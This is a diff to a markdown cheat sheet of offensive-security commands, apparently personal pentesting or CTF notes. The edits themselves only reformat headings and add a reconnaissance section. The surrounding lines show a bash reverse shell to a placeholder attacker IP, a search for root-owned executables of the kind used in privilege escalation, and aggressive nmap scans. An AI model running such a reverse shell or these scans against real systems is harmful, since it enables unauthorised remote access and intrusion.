@@ -173,7 +173,7 @@ system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
 
 `find / -user root -executable -type f 2>/dev/null`: Search for root files that are executable
 
-##ENVIRONMENT VARIABLES
+## ENVIRONMENT VARIABLES
 `$PATH`
 
 `$HOME`
@@ -196,8 +196,9 @@ system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
 `lsattr FILE_NAME`: List the advanced permissions
 
 `chattr +i FILE_NAME`: Add the inmutable bit to the file (Advanced permission)
+## RECONNAISSANCE
+### NMAP
 
-## NMAP
 `nmap -p- --open -T5 -v -n IP`
 
 `nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn "IP" -oG allPorts`
